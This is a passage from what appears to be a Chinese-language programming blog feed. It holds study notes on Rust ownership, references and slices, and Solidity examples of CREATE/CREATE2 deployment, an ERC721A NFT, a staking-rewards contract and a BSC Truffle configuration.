一个字节的空间</span><br><span class="line"></span><br><span class="line">  符合类型</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> */</span><br><span class="line">    // let guess: u32 = &quot;42&quot;.parse().expect(&quot;not a number&quot;);</span><br><span class="line">    // println!(&quot;&#123;&#125;&quot;, guess) ;</span><br><span class="line"></span><br><span class="line">    // let tup: (i32, f64, u8) = (500, 6.4, 1);</span><br><span class="line">    // let (x, y, z) = tup;</span><br><span class="line"></span><br><span class="line">    // println!(&quot;&#123;&#125;&quot;,tup.0);</span><br><span class="line"></span><br><span class="line">    // println!(&quot;&#123;&#125;&quot;,x);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // let months = [&quot;January&quot;, &quot;February&quot;, &quot;March&quot;, &quot;April&quot;, &quot;May&quot;, &quot;June&quot;, &quot;July&quot;,</span><br><span class="line">    //           &quot;August&quot;, &quot;September&quot;, &quot;October&quot;, &quot;November&quot;, &quot;December&quot;];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // 声明数组 </span><br><span class="line"></span><br><span class="line">    // let a: [i32; 5] = [1, 2, 3, 4, 5];</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    println!(&quot;Hello, world!&quot;);</span><br><span class="line">    // another_function(5); // argument</span><br><span class="line">    </span><br><span class="line">    let x= five(6);</span><br><span class="line">    println!(&quot;&#123;&#125;&quot;,x);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fn five(x:i32) -&gt; i32&#123;</span><br><span class="line">    5+x</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// fn another_function()&#123;</span><br><span class="line">//     println!(&quot;another function&quot;);</span><br><span class="line">// &#125;</span><br><span class="line"></span><br><span class="line">fn another_function(x: i32)&#123;  // parameter </span><br><span class="line">    println!(&quot;  x  is &#123;&#125;&quot;,x );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h1 id="所有权"><a href="#所有权" class="headerlink" title="所有权"></a>所有权</h1><h2 id="stack-amp-amp-heap"><a href="#stack-amp-amp-heap" class="headerlink" title="stack &amp;&amp; heap"></a>stack &amp;&amp; heap</h2><p>在很多语言中，你并不需要经常考虑到栈与堆。不过在像 Rust 这样的系统编程语言中，值是位于栈上还是堆上在更大程度上影响了语言的行为以及为何必须做出这样的抉择。我们会在本章的稍后部分描述所有权与栈和堆相关的内容，所以这里只是一个用来预热的简要解释。</p>
-<p>栈和堆都是代码在运行时可供使用的内存，但是它们的结构不同。栈以放入值的顺序存储值并以相反顺序取出值。这也被称作 后进先出（last in, first out）。想象一下一叠盘子：当增加更多盘子时，把它们放在盘子堆的顶部，当需要盘子时，也从顶部拿走。不能从中间也不能从底部增加或拿走盘子！增加数据叫做 进栈（pushing onto the stack），而移出数据叫做 出栈（popping off the stack）。栈中的所有数据都必须占用已知且固定的大小。在编译时大小未知或大小可能变化的数据，要改为存储在堆上。 堆是缺乏组织的：当向堆放入数据时，你要请求一定大小的空间。内存分配器（memory allocator）在堆的某处找到一块足够大的空位，把它标记为已使用，并返回一个表示该位置地址的 指针（pointer）。这个过程称作 在堆上分配内存（allocating on the heap），有时简称为 “分配”（allocating）。将数据推入栈中并不被认为是分配。因为指针的大小是已知并且固定的，你可以将指针存储在栈上，不过当需要实际数据时，必须访问指针。想象一下去餐馆就座吃饭。当进入时，你说明有几个人，餐馆员工会找到一个够大的空桌子并领你们过去。如果有人来迟了，他们也可以通过询问来找到你们坐在哪。</p>
-<p>入栈比在堆上分配内存要快，因为（入栈时）分配器无需为存储新数据去搜索内存空间；其位置总是在栈顶。相比之下，在堆上分配内存则需要更多的工作，这是因为分配器必须首先找到一块足够存放数据的内存空间，并接着做一些记录为下一次分配做准备。</p>
-<p>访问堆上的数据比访问栈上的数据慢，因为必须通过指针来访问。现代处理器在内存中跳转越少就越快（缓存）。继续类比，假设有一个服务员在餐厅里处理多个桌子的点菜。在一个桌子报完所有菜后再移动到下一个桌子是最有效率的。从桌子 A 听一个菜，接着桌子 B 听一个菜，然后再桌子 A，然后再桌子 B 这样的流程会更加缓慢。出于同样原因，处理器在处理的数据彼此较近的时候（比如在栈上）比较远的时候（比如可能在堆上）能更好的工作。在堆上分配大量的空间也可能消耗时间。</p>
-<p>当你的代码调用一个函数时，传递给函数的值（包括可能指向堆上数据的指针）和函数的局部变量被压入栈中。当函数结束时，这些值被移出栈。</p>
-<p>跟踪哪部分代码正在使用堆上的哪些数据，最大限度的减少堆上的重复数据的数量，以及清理堆上不再使用的数据确保不会耗尽空间，这些问题正是所有权系统要处理的。一旦理解了所有权，你就不需要经常考虑栈和堆了，不过明白了所有权的主要目的就是为了管理堆数据，能够帮助解释为什么所有权要以这种方式工作。</p>
-<h1 id="所有权与函数"><a href="#所有权与函数" class="headerlink" title="所有权与函数"></a>所有权与函数</h1><h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let s= String::from(&quot;Hello&quot;);</span><br><span class="line">    let len = calculate_length(&amp;s);</span><br><span class="line"></span><br><span class="line">    println!(&quot;  the length of &#123;&#125;  is &#123;&#125;&quot;,s,len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fn calculate_length(s: &amp;String) -&gt; usize&#123;</span><br><span class="line">    s.len()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>&amp; 符号就是引用，允许你引用一些值 </p>
-<p>不可以修改借用的东西</p>
-<h2 id="可变引用"><a href="#可变引用" class="headerlink" title="可变引用"></a>可变引用</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let mut s= String::from(&quot;Hello&quot;);</span><br><span class="line">    let len = calculate_length(&amp;mut s);</span><br><span class="line"></span><br><span class="line">    println!(&quot;  the length of &#123;&#125;  is &#123;&#125;&quot;,s,len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fn calculate_length(s: &amp;mut String) -&gt; usize&#123;</span><br><span class="line">    s.push_str(&quot;,world&quot;);</span><br><span class="line">    s.len()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><p>只能有一个可变引用</p>
-<ul>
-<li>防止数据竞争。</li>
-</ul>
-</li>
-<li><p>三种行为会发生数据竞争</p>
-<ul>
-<li>两个或者多个指针同时访问同一个数据。</li>
-<li>至少有一个指针用于写入数据。</li>
-<li>没有任何机制来同步对数据的访问。</li>
-</ul>
-</li>
-<li><p>另外一个限制</p>
-<ul>
-<li>不可以同时拥有一个可变引用和一个不变的引用</li>
-<li>多个不变的引用是可以的。</li>
-</ul>
-</li>
-</ul>
-<h2 id="悬空引用"><a href="#悬空引用" class="headerlink" title="悬空引用"></a>悬空引用</h2><p>dangling pointer :一个指针引用内存中的某个地址，而这块内存已经释放并且分配给其他人使用了。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let r =dangle()</span><br><span class="line">&#125;</span><br><span class="line">fn dangle() -&gt; &amp;String&#123;</span><br><span class="line">    let s =String::from(&quot;hello&quot;);</span><br><span class="line">    &amp;s</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">error[E0106]: missing lifetime specifier</span><br></pre></td></tr></table></figure>
-
-<h1 id="4-3切片"><a href="#4-3切片" class="headerlink" title="4.3切片"></a>4.3切片</h1><p>提供一种不持有所有权的数据类型：切片（slice）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">     let mut s =String::from(&quot;hello world&quot;);</span><br><span class="line">     let wordIndex = first_world(&amp;s );</span><br><span class="line">     s.clear();</span><br><span class="line">     println!(&quot;  &#123;&#125;&quot;, wordIndex);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn first_world(s: &amp;String) -&gt;usize&#123;</span><br><span class="line">    let bytes =s.as_bytes();</span><br><span class="line">    for (i ,&amp;item) in bytes.iter().enumerate()&#123;</span><br><span class="line">        if item == b&#x27; &#x27;&#123;</span><br><span class="line">            return i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    s.len()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-]]></content>
-      <tags>
-        <tag>Rust</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>2-4ETH_THINKINGCHAIN</title>
-    <url>/2021/06/29/2-4ETH-THINKINGCHAIN/</url>
-    <content><![CDATA[<h1 id="Solidity部署合约的两种方式CREATE与CREATE2"><a href="#Solidity部署合约的两种方式CREATE与CREATE2" class="headerlink" title="Solidity部署合约的两种方式CREATE与CREATE2"></a>Solidity部署合约的两种方式CREATE与CREATE2</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Token&#123;</span><br><span class="line"></span><br><span class="line">    uint256 private a;</span><br><span class="line"></span><br><span class="line">    constructor()&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setA(uint256 _a) public&#123;</span><br><span class="line">         a=_a;</span><br><span class="line">    &#125;</span><br><span class="line">    function getA() public view returns(uint256)&#123;</span><br><span class="line">        return a;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract Creator&#123;</span><br><span class="line"></span><br><span class="line">    Token token ;</span><br><span class="line"></span><br><span class="line">    function deploy() public&#123;</span><br><span class="line">        token =new Token();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setTokenA(uint256 _a) public &#123;</span><br><span class="line">        token.setA(_a);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function  getTokenA() public view returns(uint256)&#123;</span><br><span class="line">        return token.getA();</span><br><span class="line">    &#125;</span><br><span class="line">    function getTokenAAddress() public view returns(address)&#123;</span><br><span class="line">        return address(token);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>create</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Token&#123;</span><br><span class="line"></span><br><span class="line">    uint256 private a;</span><br><span class="line"></span><br><span class="line">    constructor()&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setA(uint256 _a) public&#123;</span><br><span class="line">         a=_a;</span><br><span class="line">    &#125;</span><br><span class="line">    function getA() public view returns(uint256)&#123;</span><br><span class="line">        return a;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract Creator&#123;</span><br><span class="line"></span><br><span class="line">    Token token ;</span><br><span class="line"></span><br><span class="line">    function deploy() public returns(address addr)&#123;</span><br><span class="line">        // token =new Token();</span><br><span class="line"></span><br><span class="line">        bytes memory byteCode= type(Token).creationCode;</span><br><span class="line"></span><br><span class="line">        assembly&#123;</span><br><span class="line">            // 得到32位偏移量 然后放到堆栈</span><br><span class="line">            addr := create(0,add(byteCode,32),mload(byteCode))</span><br><span class="line">            if iszero(extcodesize(addr))&#123;</span><br><span class="line">                revert(0,0)</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        token =Token(addr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setTokenA(uint256 _a) public &#123;</span><br><span class="line">        token.setA(_a);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function  getTokenA() public view returns(uint256)&#123;</span><br><span class="line">        return token.getA();</span><br><span class="line">    &#125;</span><br><span class="line">    function getTokenAAddress() public view returns(address)&#123;</span><br><span class="line">        return address(token);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>salt</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Token&#123;</span><br><span class="line"></span><br><span class="line">    uint256 private a;</span><br><span class="line"></span><br><span class="line">    constructor()&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setA(uint256 _a) public&#123;</span><br><span class="line">         a=_a;</span><br><span class="line">    &#125;</span><br><span class="line">    function getA() public view returns(uint256)&#123;</span><br><span class="line">        return a;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract Creator&#123;</span><br><span class="line"></span><br><span class="line">    Token token ;</span><br><span class="line"></span><br><span class="line">    function deploy(string calldata _salt ) public returns(address addr)&#123;</span><br><span class="line">        // token =new Token();</span><br><span class="line"></span><br><span class="line">        //在0.6.0后可以用  底层是create2是实现方式</span><br><span class="line">        bytes32 saltBytes= keccak256(bytes(_salt));</span><br><span class="line">        token =new Token&#123;salt:saltBytes&#125;();</span><br><span class="line">        </span><br><span class="line">        return address(token);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setTokenA(uint256 _a) public &#123;</span><br><span class="line">        token.setA(_a);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function  getTokenA() public view returns(uint256)&#123;</span><br><span class="line">        return token.getA();</span><br><span class="line">    &#125;</span><br><span class="line">    function getTokenAAddress() public view returns(address)&#123;</span><br><span class="line">        return address(token);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>create2</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Token&#123;</span><br><span class="line"></span><br><span class="line">    uint256 private a;</span><br><span class="line"></span><br><span class="line">    constructor()&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setA(uint256 _a) public&#123;</span><br><span class="line">         a=_a;</span><br><span class="line">    &#125;</span><br><span class="line">    function getA() public view returns(uint256)&#123;</span><br><span class="line">        return a;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract Creator&#123;</span><br><span class="line"></span><br><span class="line">    Token token ;</span><br><span class="line"></span><br><span class="line">    function deploy(string calldata _salt ) public returns(address addr)&#123;</span><br><span class="line">        // token =new Token();</span><br><span class="line"></span><br><span class="line">        //在0.6.0后可以用  底层是create2是实现方式</span><br><span class="line">        bytes memory byteCode= type(Token).creationCode;</span><br><span class="line">        bytes32 saltBytes= keccak256(bytes(_salt));</span><br><span class="line">      </span><br><span class="line"></span><br><span class="line">        assembly&#123;</span><br><span class="line">            // 得到32位偏移量 然后放到堆栈</span><br><span class="line">            addr := create2(0,add(byteCode,32),mload(byteCode),saltBytes)</span><br><span class="line">            if iszero(extcodesize(addr))&#123;</span><br><span class="line">                revert(0,0)</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        token =Token(addr);</span><br><span class="line">        </span><br><span class="line">         return address(token);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setTokenA(uint256 _a) public &#123;</span><br><span class="line">        token.setA(_a);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function  getTokenA() public view returns(uint256)&#123;</span><br><span class="line">        return token.getA();</span><br><span class="line">    &#125;</span><br><span class="line">    function getTokenAAddress() public view returns(address)&#123;</span><br><span class="line">        return address(token);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h1 id="ERC721A-介绍"><a href="#ERC721A-介绍" class="headerlink" title="ERC721A 介绍"></a>ERC721A 介绍</h1><p><a class="link"   href="https://www.azuki.com/erc721a" >https://www.azuki.com/erc721a<i class="fas fa-external-link-alt"></i></a></p>
-<p>ERC721A更省气，而且可以批量挖币</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line"></span><br><span class="line">import &quot;https://github.com/chiru-labs/ERC721A/blob/main/contracts/ERC721A.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/access/Ownable.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract ThinkingChain is ERC721A, Ownable  &#123;</span><br><span class="line"></span><br><span class="line">    string private constant SUFFIX_URI = &quot;.json&quot;;</span><br><span class="line"></span><br><span class="line">    constructor() ERC721A(&quot;ThinkingChain&quot;, &quot;TKGC&quot;) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function mint(uint256 quantity) external payable &#123;</span><br><span class="line">        _mint(msg.sender, quantity);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function safeMint(address to,uint256 quantity) public onlyOwner &#123;</span><br><span class="line">         _mint(to, quantity);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _baseURI() internal pure override returns (string memory) &#123;</span><br><span class="line">        return &quot;https://thinkingchain.app/&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function tokenURI(uint256 tokenId) public view override returns (string memory) &#123;</span><br><span class="line">        string memory baseTokenIdUri = super.tokenURI(tokenId);</span><br><span class="line">        return string(abi.encodePacked(baseTokenIdUri,SUFFIX_URI));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h1 id="质押挖矿"><a href="#质押挖矿" class="headerlink" title="质押挖矿"></a>质押挖矿</h1><h2 id="质押A代币，收益A、B或其他ERC20代币"><a href="#质押A代币，收益A、B或其他ERC20代币" class="headerlink" title="质押A代币，收益A、B或其他ERC20代币"></a>质押A代币，收益A、B或其他ERC20代币</h2><p><img src="/images/web3/shou1.png" alt="images"></p>
-<p><img src="/images/web3/shou2.png" alt="images"></p>
-<p><img src="/images/web3/shou3.png" alt="images"></p>
-<p><img src="/images/web3/shou4.png" alt="images"></p>
-<p><img src="/images/web3/shou5.png" alt="images"></p>
-<p><img src="/images/web3/shou6.png" alt="images"><br><img src="/images/web3/shou7.png" alt="images"></p>
-<ul>
-<li>StakingToken.sol</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/access/Ownable.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract StakingToken is ERC20, ERC20Burnable, Ownable &#123;</span><br><span class="line">    constructor() ERC20(&quot;StakingToken&quot;, &quot;SWK&quot;) &#123;</span><br><span class="line">        _mint(msg.sender, 10000);</span><br><span class="line">		_mint(0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2, 10000);</span><br><span class="line">		_mint(0x4B20993Bc481177ec7E8f571ceCaE8A9e22C02db, 10000);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function mint(address to, uint256 amount) public onlyOwner &#123;</span><br><span class="line">        _mint(to, amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>RewardsToken.sol</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/access/Ownable.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract RewardsToken is ERC20, ERC20Burnable, Ownable &#123;</span><br><span class="line">    constructor() ERC20(&quot;RewardsToken&quot;, &quot;RWK&quot;) &#123;</span><br><span class="line">        _mint(msg.sender, 10000 * 10 ** decimals());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function mint(address to, uint256 amount) public onlyOwner &#123;</span><br><span class="line">        _mint(to, amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<ul>
-<li>StakingRewards.sol</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8;</span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;</span><br><span class="line">import &quot;hardhat/console.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract StakingRewards &#123;</span><br><span class="line">    IERC20 public rewardsToken;</span><br><span class="line">    IERC20 public stakingToken;</span><br><span class="line"></span><br><span class="line">    uint public rewardRate = 100;</span><br><span class="line">    uint public lastUpdateTime;</span><br><span class="line">    uint public rewardPerTokenStored;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; uint) public userRewardPerTokenPaid;</span><br><span class="line">    mapping(address =&gt; uint) public rewards;</span><br><span class="line"></span><br><span class="line">    uint private _totalSupply;</span><br><span class="line">    mapping(address =&gt; uint) private _balances;</span><br><span class="line"></span><br><span class="line">    constructor(address _stakingToken, address _rewardsToken) &#123;</span><br><span class="line">        stakingToken = IERC20(_stakingToken);</span><br><span class="line">        rewardsToken = IERC20(_rewardsToken);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    // S=∑_t=0^tb▒R/L(t) </span><br><span class="line">    function rewardPerToken() public view returns (uint) &#123;</span><br><span class="line">        if (_totalSupply == 0) &#123;</span><br><span class="line">            return rewardPerTokenStored;</span><br><span class="line">        &#125;</span><br><span class="line">        // s+=(Tb-Ta)*R/100</span><br><span class="line">        return</span><br><span class="line">            rewardPerTokenStored +</span><br><span class="line">            (((block.timestamp - lastUpdateTime) * rewardRate ) / _totalSupply);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // r(u, ta, tb) = l(S − P)</span><br><span class="line">    // l = _balances[account]</span><br><span class="line">    // s = rewardPerToken() =  s+=(Tb-Ta)*R/100</span><br><span class="line">    // p = userRewardPerTokenPaid[account])</span><br><span class="line">    // rewards[account] 加上之前未体现的收益</span><br><span class="line">    function earned(address account) public view returns (uint) &#123;</span><br><span class="line">        return</span><br><span class="line">            ((_balances[account] * </span><br><span class="line">             (rewardPerToken() - userRewardPerTokenPaid[account])))  </span><br><span class="line">             +  rewards[account];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier updateReward(address account) &#123;</span><br><span class="line">        rewardPerTokenStored = rewardPerToken();</span><br><span class="line">        console.log(&quot;pre user amount:&quot;,_balances[account]);</span><br><span class="line">        console.log(&quot;pre L(t):&quot;,_totalSupply);</span><br><span class="line">        console.log(&quot;S:&quot;,rewardPerTokenStored);</span><br><span class="line">        lastUpdateTime = block.timestamp;</span><br><span class="line">        console.log(&quot;pre P:&quot;,userRewardPerTokenPaid[account]);</span><br><span class="line">        rewards[account] = earned(account);</span><br><span class="line">        userRewardPerTokenPaid[account] = rewardPerTokenStored;</span><br><span class="line">        console.log(&quot;currrent P:&quot;,userRewardPerTokenPaid[account]);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function stake(uint _amount) external updateReward(msg.sender) &#123;</span><br><span class="line">        console.log(&quot;user:&quot;,msg.sender);</span><br><span class="line">        console.log(&quot;stake action&quot;);</span><br><span class="line">        _totalSupply += _amount;</span><br><span class="line">        _balances[msg.sender] += _amount;</span><br><span class="line">        console.log(&quot;current user amount:&quot;,_balances[msg.sender]);</span><br><span class="line">        console.log(&quot;current L(t):&quot;,_totalSupply);</span><br><span class="line">        stakingToken.transferFrom(msg.sender, address(this), _amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint _amount) external updateReward(msg.sender) &#123;</span><br><span class="line">        console.log(&quot;user:&quot;,msg.sender);</span><br><span class="line">        console.log(&quot;withdraw action&quot;);</span><br><span class="line">        _totalSupply -= _amount;</span><br><span class="line">        _balances[msg.sender] -= _amount;</span><br><span class="line">        console.log(&quot;current user amount:&quot;,_balances[msg.sender]);</span><br><span class="line">        console.log(&quot;current L(t):&quot;,_totalSupply);</span><br><span class="line">        stakingToken.transfer(msg.sender, _amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getReward() external updateReward(msg.sender) &#123;</span><br><span class="line">        console.log(&quot;user:&quot;,msg.sender);</span><br><span class="line">        console.log(&quot;getReward action&quot;);</span><br><span class="line">        uint reward = rewards[msg.sender];</span><br><span class="line">        rewards[msg.sender] = 0;</span><br><span class="line">        console.log(&quot;current user amount:&quot;,_balances[msg.sender]);</span><br><span class="line">        console.log(&quot;current L(t):&quot;,_totalSupply);</span><br><span class="line">        rewardsToken.transfer(msg.sender, reward);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h1 id="BSC网络"><a href="#BSC网络" class="headerlink" title="BSC网络"></a>BSC网络</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">require(&#x27;dotenv&#x27;).config();</span><br><span class="line">const privateKeys = process.env.PRIVATE_KEYS || &quot;&quot;</span><br><span class="line">const HDWalletProvider = require(&#x27;@truffle/hdwallet-provider&#x27;);</span><br><span class="line"></span><br><span class="line">module.exports = &#123;</span><br><span class="line">  networks: &#123;</span><br><span class="line">    bsc_testnet: &#123;</span><br><span class="line">      provider: () =&gt; new HDWalletProvider(</span><br><span class="line">        privateKeys.split(&#x27;,&#x27;),</span><br><span class="line">        `https://data-seed-prebsc-1-s1.binance.org:8545`</span><br><span class="line">      ),</span><br><span class="line">      network_id: 97,</span><br><span class="line">      confirmations: 10,</span><br><span class="line">      timeoutBlocks: 200,</span><br><span class="line">      skipDryRun: true</span><br><span class="line">    &#125;,</span><br><span class="line">    bsc_mainnet: &#123;</span><br><span class="line">      provider: () =&gt; new HDWalletProvider(</span><br><span class="line">        privateKeys.split(&#x27;,&#x27;),</span><br><span class="line">        `https://bsc-dataseed1.binance.org`</span><br><span class="line">      ),</span><br><span class="line">      network_id: 56,</span><br><span class="line">      confirmations: 10,</span><br><span class="line">      timeoutBlocks: 200,</span><br><span class="line">      skipDryRun: true</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  compilers: &#123;</span><br><span class="line">    solc: &#123;</span><br><span class="line">      version: &quot;&gt;=0.6.0 &lt;0.8.0&quot;,</span><br><span class="line">      optimizer: &#123;</span><br><span class="line">        enabled: true,</span><br><span class="line">        runs: 200</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p><a class="link"   href="https://testnet.binance.org/faucet-smart" >https://testnet.binance.org/faucet-smart<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   href="https://testnet.bscscan.com/" >https://testnet.bscscan.com<i class="fas fa-external-link-alt"></i></a></p>
-<h1 id="Openzeppelin系列-闪电贷-Flash-Minting"><a href="#Openzeppelin系列-闪电贷-Flash-Minting" class="headerlink" title="Openzeppelin系列| 闪电贷 Flash Minting"></a>Openzeppelin系列| 闪电贷 Flash Minting</h1><p>设置放贷<br><img src="/images/web3/fl1.png" alt="images"></p>
-<p><img src="/images/web3/fl2.png" alt="images"></p>
-<p><img src="/images/web3/fl3.png" alt="images"></p>
-<p><img src="/images/web3/fl4.png" alt="images"></p>
-<p>合约代码Flashloan.sol</p>
